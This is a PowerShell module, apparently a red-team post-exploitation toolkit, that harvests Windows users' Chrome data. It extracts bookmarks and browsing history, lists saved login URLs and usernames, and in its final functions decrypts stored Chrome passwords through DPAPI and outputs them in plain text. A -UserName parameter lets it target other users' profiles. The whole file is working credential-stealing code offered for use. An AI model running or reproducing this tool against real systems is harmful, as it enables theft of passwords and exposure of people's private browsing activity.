Function Get-ChromeBookmarks {
    <#
    .SYNOPSIS
        Returns the Chrome bookmark entries
        Author: Jake Miller (@LaconicWolf) 
        Required Dependencies: None
    .DESCRIPTION
        Reads the Bookmarks JSON file to gather bookmark information.
    .PARAMETER UserName
        Specifies which User's bookmarks file will be Retrieved. Defaults
        to $env:USERNAME.
    .EXAMPLE
        PS C:\> Get-ChromeBookmarks
        Will return all bookmarks.
    .EXAMPLE
        PS C:\> Get-ChromeBookmarks | Where-Object { $_.url.startswith('https')}
        Will return all HTTPS bookmarks.
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false)]
        $UserName = $env:USERNAME
    )

    $Path = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    if (-not (Test-Path -Path $Path)){
        Write-Verbose "[*] Could not find Chrome bookmarks for username: $UserName"
        return
    }
    $data = Get-Content $Path -Raw | ConvertFrom-Json
    $urls = $data.roots.bookmark_bar.children.url
    foreach ($url in $urls){
        New-Object -TypeName PSObject -Property @{ URL=$url}
    }
}


Function Scrape-ChromeHistory {
    <#
    .SYNOPSIS
        Returns the domains listed in the Chrome history file.
        Author: Jake Miller (@LaconicWolf) 
        Referenced: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1
        Required Dependencies: None
    .DESCRIPTION
        Performs a regex scrape of the Chrome history file to gather domains.
    .PARAMETER UserName
        Specifies which User's history file will be scraped. Defaults
        to $env:USERNAME.
    .EXAMPLE
        PS C:\> Scrape-ChromeHistory
        Will return all bookmarks.
    .EXAMPLE
        PS C:\> Scrape-ChromeHistory -Search  Github
        Will domains containing the string 'Github'.
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false)]
        $UserName = $env:USERNAME,

        [Parameter(Mandatory = $false)]
        $Search
    )

    $Path = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"
    if (-not (Test-Path -Path $Path)){
        Write-Verbose "[*] Could not find Chrome history for username: $UserName"
        return
    }
    $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $urls = Get-Content -Path $Path | Select-String -Pattern $regex -AllMatches | % {($_.Matches).Value} | Sort-Object -Unique
    foreach ($url in $urls) {
        if (-not($url -match $Search)) {
            continue
        }
        New-Object -TypeName PSObject -Property @{URL = $url}
    }
}

Function Get-ChromeLoginURLS {
    <#
    .SYNOPSIS
        Returns the URLs and Usernames listed in the Chrome login_data file.
        Author: Jake Miller (@LaconicWolf) 
        Required Dependencies: None
    .DESCRIPTION
        Queries the login_data file and returns the URLs and usernames.
    .PARAMETER UserName
        Specifies which User's login_date file will be queried. Defaults
        to $env:USERNAME.
    .EXAMPLE
        PS C:\> Get-ChromeLoginURLS
        Will return all URLs and usernames within the login_data file.
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false)]
        $UserName = $env:USERNAME
    )

    $module = Get-Module -List PSSQLite

    if (!$module) {
        Write-Host "`nUnable to locate the PSSQLite module. Exiting." -ForegroundColor Yellow
        return
    }
    Import-Module PSSQLite

    $SQLiteDbPath = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"

    if (-not (Test-Path -Path $SQLiteDbPath)){
        Write-Verbose "[*] Could not find the Chrome Login_data file for user: $UserName"
        return
    }

    Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT origin_url, username_value FROM logins"
    
}


Function Get-ChromeHistory {
    <#
    .SYNOPSIS
        Returns the Chrome URL history
        Author: Jake Miller (@LaconicWolf) 
        Required Dependencies: PSSQLite
    .DESCRIPTION
        Queries the Chrome History file to gather URL history information.
        When no options are specified the database is printed. A variety of 
        options can be specified via the parameters. Additionally, the Query 
        parameter can be used to return customized results.
    .PARAMETER UserName
        Specifies which User's History file will be queried. Defaults
        to $env:USERNAME.
    .PARAMETER Search
        Specifies a string to search for in the URL and querystring.
    .PARAMETER Query
        Allows for custome queries against the places.sqlite file.
    .PARAMETER NumberOfDays
        Limits returned data to match only entries greater than the 
        current date minus the number of days specified.
    .PARAMETER MostVisited
        Will sort the sites by visit count and return only 
        the n most visited URLs along with their visit count.
    .PARAMETER AllUrls
        Returns all URLs in the file
    .PARAMETER ShowColumns
        Prints the database schema so it easier to create custom queries.              
    .EXAMPLE
        PS C:\> Get-ChromeHistory -AllUrls
        Gathers all URLs in the file. Note: This also includes the bookmarks,
        as they are in the same file
    .EXAMPLE
        PS C:\> Get-ChromeHistory -Query "SELECT * from moz_places"
        Custom query that returns everything from the moz_places table.
    .EXAMPLE
        PS C:\> Get-ChromeHistory -Search login
        Returns all URLs that contain 'login' in the URL/querystring
    .EXAMPLE
        PS C:\> Get-ChromeHistory -MostVisited 10
        Returns the 10 most visited URLs and their visit counts
    #>

    [CmdletBinding()]
    Param(

        [Parameter(Mandatory = $false)]
        $UserName = $env:USERNAME,

        [Parameter(Mandatory = $false)]
        $Search,

        [Parameter(Mandatory = $false)]
        $Query,

        [Parameter(Mandatory = $false)]
        $NumberOfDays,

        [Parameter(Mandatory = $false)]
        $MostVisited,

        [Parameter(Mandatory = $false)]
        [switch]
        $AllUrls,

        [Parameter(Mandatory = $false)]
        [switch]
        $ShowColumns

    )

    $module = Get-Module -List PSSQLite

    if (!$module) {
        Write-Host "`nUnable to locate the PSSQLite module. Use the function 'Scrape-ChromeHistory' instead." -ForegroundColor Yellow
        return
    }
    Import-Module PSSQLite


    $SQLiteDbPath = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"

    if (-not (Test-Path -Path $SQLiteDbPath)){
        Write-Verbose "[*] Could not find the Chrome History file for user: $UserName"
        return
    }

    if ($ShowColumns) {
        Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "PRAGMA table_info(urls)" | Select-Object name
    }

    elseif ($AllUrls) {
        Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT url FROM urls"
    }

    elseif ($Search) {
        Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT url FROM urls WHERE url LIKE '%$Search%'"
    }

    elseif ($Query) {
        Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query $Query 
    }

    elseif ($NumberOfDays) {
       
        # Convert to strange, Gregorian, Chrome time
        $date1 = Get-Date -Date "01/01/1601"
        $date2 = (Get-Date).AddDays(-$NumberOfDays)
        [int64]$timeLimit = (New-TimeSpan -Start $date1 -End $date2).TotalSeconds

        Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT url,last_visit_time FROM urls" | ForEach-Object {

            # Convert last_visit_date to string to remove trailing digits
            $strtime = [string]$_.last_visit_time
            try {

                # Removes 6 trailing digits (to match $timelimit), and converts back to int
                [int64]$visitTime = $strtime.Substring(0, $strtime.Length-6)
            }

            #handles errors for null last_visit_time
            Catch {
                Continue
            }
            if ($visitTime -gt $timeLimit) {
                New-object -TypeName PSObject -Property @{URL=$_.url} 
            }
        }
    }

    elseif ($MostVisited) {
        Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT * FROM urls" | Sort-Object -Property visit_count -Descending | Select-Object url,visit_count -First $MostVisited
    }

    else {
        # If no options were specified just dump everything
        Write-Output "`nNo options specified. Dumping database.`n"
        Start-Sleep -Seconds 3
        Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT * FROM urls"
    }
}


Function Decrypt-Password {
    <#
    .SYNOPSIS
        Helper function that uses the DPAPI to decrypt Chrome passwords.
        Author: Jake Miller (@LaconicWolf). Adapted from https://github.com/p0z/CPD/blob/master/Chrome_Passwords_Decryptor.ps1 
    .DESCRIPTION
        Uses the DPAPI to decrypt Chrome passwords.
    #>
    
    Param(
        [Parameter(Mandatory = $true)]
        $EncryptedPassword
    )

    $DecryptedChars = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedPassword.password_value, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
    foreach ($char in $DecryptedChars) {
        $password += [Convert]::ToChar($char)
    }
    return $password
} 

Function Get-ChromeCredentialData {
    <#
    .SYNOPSIS
        Returns the URL, Username, and decrypted passwords listed in the Chrome login_data file.
        Author: Jake Miller (@LaconicWolf) Adapted from https://github.com/p0z/CPD/blob/master/Chrome_Passwords_Decryptor.ps1 
        Required Dependencies: PSSQLITE
    .DESCRIPTION
        Queries the login_data file and returns the URLs, usernames, and decrypted passwords.
    .PARAMETER UserName
        Specifies which User's login_date file will be queried. Defaults
        to $env:USERNAME.
    .EXAMPLE
        PS C:\> Get-ChromeCredentialData
        Will return all URLs and usernames within the login_data file.
    #>
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false)]
        $UserName = $env:USERNAME
    )

    $module = Get-Module -List PSSQLite

    if (!$module) {
        Write-Host "`nUnable to locate the PSSQLite module. Exiting." -ForegroundColor Yellow
        return
    }
    Import-Module PSSQLite

    $SQLiteDbPath = "$Env:SystemDrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"

    if (-not (Test-Path -Path $SQLiteDbPath)){
        Write-Verbose "[*] Could not find the Chrome Login_data file for user: $UserName"
        return
    }

    $data = Invoke-SqliteQuery -DataSource $SQLiteDbPath -Query "SELECT origin_url, username_value, password_value FROM logins" 
    $data | ForEach-Object {
        $url = $_.origin_url
        $username = $_.username_value
        $password = Decrypt-Password -EncryptedPassword $_
        if ($username -or $password) {
            New-Object -TypeName PSObject -Property @{
                URL = $url
                USERNAME = $username
                PASSWORD = $password
            }
        }
    }
}
